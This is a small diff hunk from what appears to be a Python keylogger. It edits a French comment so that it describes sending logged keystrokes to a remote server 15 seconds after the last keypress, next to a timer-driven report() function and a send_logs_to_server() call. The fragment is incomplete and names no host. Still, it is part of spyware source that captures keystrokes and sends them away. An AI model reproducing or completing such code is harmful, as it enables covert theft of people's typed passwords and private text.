@@ -65,7 +65,7 @@ def report():
                 logfile.close()
         threading.Timer(1, report).start()
     else:
-        if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de sauvegarder dans le fichier de log
+        if time.time() - last_keypress_time >= 15: #attend 15 secondes après la dernière frappe avant de l'envoyer au serveur distant
             if log:
                 send_logs_to_server()
 
